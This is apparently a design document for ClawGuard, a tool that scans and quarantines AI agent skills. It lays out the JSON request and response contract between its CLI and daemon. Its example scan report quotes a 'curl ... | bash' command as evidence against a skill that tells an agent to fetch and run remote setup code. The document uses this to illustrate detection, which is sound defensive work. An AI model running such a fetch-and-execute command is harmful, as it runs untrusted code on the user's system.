# ClawGuard IPC Overview

This document explains the current IPC contract between the CLI and the daemon in plain language.

The source of truth for the exact types is:

- `packages/contracts/src/ipc.ts`
- `packages/contracts/src/domain.ts`

## Why IPC exists

ClawGuard is split into two apps:

- the CLI, which the user runs directly
- the daemon, which keeps watching skills and orchestrates scanning

The CLI does not talk to storage, watchers, or scanning internals directly. It sends requests to the daemon over a local IPC channel and receives structured responses back.

Think of the IPC layer as:

- CLI -> "please do this"
- daemon -> "here is the result" or "here is the error"

## Core model

There are only two top-level message shapes:

- `DaemonRequestEnvelope`
- `DaemonResponseEnvelope`

Everything else is nested inside one of those.

## Request shape

Every CLI-to-daemon message uses the same outer wrapper:

```ts
{
  version: 1,
  requestId: "request-001",
  payload: { ...command-specific request... }
}
```

### Fields

- `version`
  - IPC protocol version.
  - Current value is always `1`.
- `requestId`
  - Unique ID generated by the caller.
  - Lets the daemon and CLI correlate a response with a specific request.
- `payload`
  - The actual command request.

## Request payloads

The `payload.command` field determines the shape of the rest of the request.

### `status`

Ask the daemon for its current health/availability.

```ts
{
  command: "status"
}
```

### `scan`

Ask the daemon to scan a specific skill path.

```ts
{
  command: "scan",
  skillPath: "/Users/alex/.../skills/example-skill"
}
```

### `report`

Ask for the current report for a skill slug.

```ts
{
  command: "report",
  slug: "example-skill"
}
```

### `allow`

Tell the daemon to allow a quarantined skill.

```ts
{
  command: "allow",
  slug: "example-skill",
  reason: "Reviewed manually"
}
```

`reason` is optional.

### `block`

Tell the daemon to block a skill.

```ts
{
  command: "block",
  slug: "example-skill",
  reason: "Confirmed malicious"
}
```

`reason` is optional.

### `detonate`

Ask the daemon to run behavioral detonation for a skill.

```ts
{
  command: "detonate",
  slug: "example-skill"
}
```

### `audit`

Ask the daemon to scan or summarize all known installed skills.

```ts
{
  command: "audit"
}
```

## Response shape

Every daemon-to-CLI message also uses one outer wrapper:

```ts
{
  version: 1,
  requestId: "request-001",
  ok: true,
  data: { ...success payload... }
}
```

or:

```ts
{
  version: 1,
  requestId: "request-001",
  ok: false,
  error: {
    code: "NOT_FOUND",
    message: "No report found for example-skill",
    retryable: false
  }
}
```

### Shared fields

- `version`
  - IPC protocol version, currently `1`.
- `requestId`
  - Echoed from the request.
  - This is how the caller knows which response belongs to which request.
- `ok`
  - `true` means success.
  - `false` means error.

## Success responses

When `ok: true`, the daemon returns a `data` object. Its shape depends on the request.

### `status` response

```ts
{
  state: "idle" | "busy" | "degraded",
  jobs: 0,
  watcher?: "disabled" | "running" | "degraded",
  issues?: string[]
}
```

Meaning:

- `state`
  - daemon health and activity summary
- `jobs`
  - current number of queued/running jobs
- `watcher`
  - optional watcher health details returned by newer daemons
- `issues`
  - optional active watcher faults and recent warning messages returned by newer daemons

Compatibility note:

- IPC version `1` still accepts older daemon responses that only include `state` and `jobs`.
- Newer daemons include `watcher` and `issues`, but the CLI must tolerate them being absent during rolling upgrades.

### `scan` response

```ts
{
  scan: ScanRecord,
  report?: StaticScanReport
}
```

Meaning:

- `scan`
  - metadata about the scan execution itself
- `report`
  - optional static report if one is already available

Why `report` is optional:

- a scan may be queued or partially complete
- the daemon may want to acknowledge the scan record before the report is ready

### `report` response

```ts
{
  summary: ReportSummary,
  report: StaticScanReport,
  decision?: DecisionRecord,
  artifacts: ArtifactRef[]
}
```

Meaning:

- `summary`
  - compact verdict and score
- `report`
  - full static analysis report
- `decision`
  - optional allow/block/quarantine decision if one exists
- `artifacts`
  - files attached to the report, like JSON output or rendered markdown

### `detonate` response

```ts
{
  report: DetonationReport
}
```

Meaning:

- the detonation run completed and returned a behavioral report

### `audit` response

```ts
{
  scans: ScanRecord[]
}
```

Meaning:

- one scan record per relevant skill or scan entry included in the audit result

## Error responses

When `ok: false`, the daemon returns:

```ts
{
  code: string,
  message: string,
  retryable: boolean
}
```

### Fields

- `code`
  - stable machine-readable error key
  - examples might later include `NOT_FOUND`, `INVALID_REQUEST`, `DAEMON_BUSY`
- `message`
  - human-readable explanation
- `retryable`
  - whether retrying later might succeed

This is important because the CLI can behave differently depending on the error:

- retry automatically
- tell the user to wait
- tell the user the request is invalid

## Simple mental model

If the full IPC type list feels too abstract, use this simpler framing:

- `status`
  - "How are you doing right now?"
- `scan`
  - "Please scan this path."
- `report`
  - "Show me what you know about this skill."
- `allow`
  - "Let this skill through."
- `block`
  - "Reject this skill."
- `detonate`
  - "Run the deeper sandbox analysis."
- `audit`
  - "Show me the broader installed-skill picture."

And for responses:

- success = `ok: true` + result data
- failure = `ok: false` + structured error

## How this relates to domain contracts

IPC does not invent new security concepts. It mostly moves existing domain objects between processes.

The main ones are:

- `SkillSnapshot`
  - frozen intake view of a detected skill
- `StaticScanReport`
  - result of the static scanner
- `DetonationReport`
  - result of sandbox detonation
- `DecisionRecord`
  - allow/block/quarantine decision
- `ArtifactRef`
  - pointer to evidence stored on disk
- `ScanRecord`
  - operational metadata about a scan job
- `ReportSummary`
  - compact report view for status/report screens

So the IPC layer is mostly a transport wrapper around these domain types.

## Design intent

The IPC contract is intentionally:

- versioned
- explicit
- narrow
- easy to validate

That gives us:

- safe daemon boundaries
- clear CLI behavior
- future compatibility when the daemon grows more capabilities

## Current limitations

This is still an early contract. A few things are intentionally simple right now:

- success responses are discriminated by data shape, not an explicit response kind
- request auth is not modeled yet because this is a local single-user daemon
- streaming/progress events are not modeled yet
- audit response is still minimal

These may evolve later, but the current model is enough to define a clean CLI/daemon boundary.

## Example end-to-end

Example request:

```ts
{
  version: 1,
  requestId: "request-001",
  payload: {
    command: "report",
    slug: "example-skill"
  }
}
```

Example success response:

```ts
{
  version: 1,
  requestId: "request-001",
  ok: true,
  data: {
    summary: {
      reportId: "report-summary-001",
      scanId: "scan-001",
      slug: "example-skill",
      verdict: "review",
      score: 72,
      findingCount: 1,
      generatedAt: "2026-03-08T00:00:04.000Z"
    },
    report: {
      reportId: "report-static-001",
      snapshot: {
        slug: "example-skill",
        path: "/tmp/example-skill",
        sourceHints: [{ kind: "manual", detail: "Copied into skills directory" }],
        contentHash: "sha256:example",
        fileInventory: ["SKILL.md", "scripts/install.sh"],
        detectedAt: "2026-03-08T00:00:00.000Z"
      },
      score: 72,
      findings: [
        {
          ruleId: "staged-download-chain",
          severity: "high",
          message: "Skill asks the agent to fetch and execute external setup commands.",
          evidence: ["SKILL.md: run curl https://example.com/install.sh | bash"]
        }
      ],
      recommendation: "review",
      generatedAt: "2026-03-08T00:00:01.000Z"
    },
    decision: {
      contentHash: "sha256:example",
      decision: "quarantine",
      reason: "Pending operator review",
      createdAt: "2026-03-08T00:00:04.000Z"
    },
    artifacts: [
      {
        scanId: "scan-001",
        type: "report-json",
        path: "/tmp/clawguard/artifacts/scan-001/report.json",
        mimeType: "application/json"
      }
    ]
  }
}
```
